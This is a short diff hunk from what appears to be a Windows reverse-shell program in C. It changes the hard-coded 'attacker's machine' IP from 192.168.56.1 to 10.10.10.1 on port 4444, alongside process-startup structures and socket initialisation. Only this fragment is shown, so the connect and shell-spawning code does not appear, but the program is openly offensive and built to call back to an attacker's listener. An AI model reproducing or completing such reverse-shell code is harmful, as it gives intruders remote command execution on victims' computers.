@@ -15,7 +15,7 @@ int main(int argc, char* argv[]) {
   STARTUPINFO si;
   PROCESS_INFORMATION pi;
   // IP and port details for the attacker's machine
-  char *attackerIP = "192.168.56.1";
+  char *attackerIP = "10.10.10.1";
   short attackerPort = 4444;
 
   // initialize socket library
